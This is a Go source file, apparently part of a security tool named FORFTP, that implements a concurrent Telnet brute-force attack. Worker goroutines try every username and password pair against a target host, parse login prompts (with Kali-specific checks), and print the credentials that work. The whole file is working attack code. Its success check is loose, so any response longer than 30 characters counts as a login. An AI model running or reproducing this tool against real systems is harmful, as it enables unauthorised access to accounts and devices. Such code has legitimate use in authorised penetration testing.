package telnet

import (
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"FORFTP/utils"

	"github.com/aprice/telnet"
)

// BruteForceResult holds the result of a Telnet login attempt
type BruteForceResult struct {
	Username string
	Password string
	Success  bool
	Error    error
}

// TelnetStats tracks statistics for the brute-force process
type TelnetStats struct {
	TotalAttempts int
	SuccessCount  int
	FailureCount  int
	ErrorCount    int
	StartTime     time.Time
	ElapsedTime   time.Duration
}

// cleanTelnetResponse removes Telnet control characters (IAC, etc.)
func cleanTelnetResponse(data []byte) string {
	var cleaned strings.Builder
	for i := 0; i < len(data); i++ {
		if data[i] == 0xFF { // Skip IAC commands
			if i+1 < len(data) && (data[i+1] >= 0xFB && data[i+1] <= 0xFE) { // DO, DONT, WILL, WONT
				i += 2 // Skip IAC + command + option
				continue
			} else if i+1 < len(data) {
				i += 1 // Skip IAC + single byte
				continue
			}
		}
		if data[i] >= 32 && data[i] <= 126 || data[i] == '\r' || data[i] == '\n' { // Printable ASCII, CR, LF
			cleaned.WriteByte(data[i])
		}
	}
	return cleaned.String()
}

// tryTelnetLogin attempts a single Telnet login
func tryTelnetLogin(target string, port int, username, password string, timeout time.Duration) (bool, error) {
	addr := fmt.Sprintf("%s:%d", target, port)
	conn, err := telnet.Dial(addr)
	if err != nil {
		return false, fmt.Errorf("connection failed: %v", err)
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 4096) // Increased buffer size
	var output strings.Builder

	// Read banner with multiple attempts
	for i := 0; i < 50; i++ { // Increased iterations
		n, err := conn.Read(buf)
		if n > 0 {
			cleaned := cleanTelnetResponse(buf[:n])
			output.WriteString(cleaned)
		}
		resp := strings.ToLower(output.String())
		fmt.Fprintf(os.Stderr, "DEBUG banner (attempt %d): %s\n", i+1, resp)
		if err != nil || strings.Contains(resp, "login") || strings.Contains(resp, "user") || strings.Contains(resp, "kali login:") {
			break
		}
		time.Sleep(500 * time.Millisecond) // Increased delay
	}

	resp := strings.ToLower(output.String())
	if !strings.Contains(resp, "login") && !strings.Contains(resp, "user") && !strings.Contains(resp, "kali login:") {
		return false, fmt.Errorf("login prompt bulunamadı: %s", resp)
	}

	// Send username
	if _, err := conn.Write([]byte(username + "\r\n")); err != nil {
		return false, fmt.Errorf("failed to send username: %v", err)
	}
	time.Sleep(1000 * time.Millisecond) // Increased delay

	// Read response after username
	output.Reset()
	for i := 0; i < 50; i++ {
		n, err := conn.Read(buf)
		if n > 0 {
			cleaned := cleanTelnetResponse(buf[:n])
			output.WriteString(cleaned)
		}
		resp = strings.ToLower(output.String())
		fmt.Fprintf(os.Stderr, "DEBUG after user (attempt %d): %s\n", i+1, resp)
		if err != nil || strings.Contains(resp, "password") {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	if !strings.Contains(resp, "password") {
		return false, fmt.Errorf("password prompt bulunamadı: %s", resp)
	}

	// Send password
	if _, err := conn.Write([]byte(password + "\r\n")); err != nil {
		return false, fmt.Errorf("failed to send password: %v", err)
	}
	time.Sleep(2000 * time.Millisecond) // Increased delay for Kali response

	// Read response after password
	output.Reset()
	for i := 0; i < 50; i++ {
		n, err := conn.Read(buf)
		if n > 0 {
			cleaned := cleanTelnetResponse(buf[:n])
			output.WriteString(cleaned)
		}
		resp = strings.ToLower(output.String())
		fmt.Fprintf(os.Stderr, "DEBUG after pass (attempt %d): %s\n", i+1, resp)
		if err != nil {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	// Check for failure (prompt reappears or explicit failure messages)
	if strings.Contains(resp, "login:") || strings.Contains(resp, "password:") ||
		strings.Contains(resp, "incorrect") || strings.Contains(resp, "failed") ||
		strings.Contains(resp, "denied") {
		return false, nil
	}

	// Check for success (Kali-specific or general indicators)
	if strings.Contains(resp, "kali developers") || strings.Contains(resp, "hushlogin") ||
		strings.Contains(resp, "welcome") || strings.Contains(resp, "last login") ||
		strings.Contains(resp, "$") || strings.Contains(resp, "#") || strings.Contains(resp, ">") ||
		len(resp) > 30 {
		return true, nil
	}

	return false, nil
}

// Worker
func telnetWorker(target string, port int, timeout time.Duration, jobs <-chan [2]string, results chan<- BruteForceResult, wg *sync.WaitGroup) {
	defer wg.Done()
	for combo := range jobs {
		user, pass := combo[0], combo[1]
		ok, err := tryTelnetLogin(target, port, user, pass, timeout)
		results <- BruteForceResult{Username: user, Password: pass, Success: ok, Error: err}
	}
}

// TelnetBruteForceConcurrent performs concurrent Telnet brute-force attempts
func TelnetBruteForceConcurrent(target string, port int, users, passwords []string, timeout time.Duration, workers int) ([]string, TelnetStats) {
	jobs := make(chan [2]string, 100)
	results := make(chan BruteForceResult, 100)
	var wg sync.WaitGroup
	stats := TelnetStats{StartTime: time.Now()}

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go telnetWorker(target, port, timeout, jobs, results, &wg)
	}

	go func() {
		for _, u := range users {
			for _, p := range passwords {
				jobs <- [2]string{u, p}
				stats.TotalAttempts++
			}
		}
		close(jobs)
	}()

	go func() {
		wg.Wait()
		close(results)
	}()

	fmt.Println(utils.Colorize("\nBrute-Force Results:", utils.ColorCyan))
	fmt.Printf("%-10s %-20s %-15s %-15s %-30s\n", utils.Colorize("Status", utils.ColorCyan), utils.Colorize("Target", utils.ColorCyan), utils.Colorize("Username", utils.ColorCyan), utils.Colorize("Password", utils.ColorCyan), utils.Colorize("Error", utils.ColorCyan))
	fmt.Println(strings.Repeat("-", 80))

	var found []string
	for res := range results {
		var status, errorMsg string
		if res.Success {
			stats.SuccessCount++
			found = append(found, fmt.Sprintf("%s:%s", res.Username, res.Password))
			status = utils.Colorize("✔ Success", utils.ColorGreen)
			errorMsg = ""
		} else if res.Error != nil {
			stats.ErrorCount++
			status = utils.Colorize("✗ Error", utils.ColorRed)
			errorMsg = utils.Colorize(res.Error.Error(), utils.ColorRed)
		} else {
			stats.FailureCount++
			status = utils.Colorize("✗ Failed", utils.ColorRed)
			errorMsg = ""
		}

		fmt.Printf("%-10s %-20s %-15s %-15s %-30s\n", status, utils.Colorize(target, utils.ColorCyan), utils.Colorize(res.Username, utils.ColorCyan), utils.Colorize(res.Password, utils.ColorCyan), errorMsg)
	}

	stats.ElapsedTime = time.Since(stats.StartTime)
	fmt.Println(utils.Colorize("\nSummary:", utils.ColorCyan))
	fmt.Printf("%s: %d\n", utils.Colorize("Total Attempts", utils.ColorCyan), stats.TotalAttempts)
	fmt.Printf("%s: %d\n", utils.Colorize("Successful Logins", utils.ColorGreen), stats.SuccessCount)
	fmt.Printf("%s: %d\n", utils.Colorize("Failed Logins", utils.ColorRed), stats.FailureCount)
	fmt.Printf("%s: %d\n", utils.Colorize("Errors", utils.ColorRed), stats.ErrorCount)
	fmt.Printf("%s: %v\n", utils.Colorize("Elapsed Time", utils.ColorCyan), stats.ElapsedTime)

	return found, stats
}
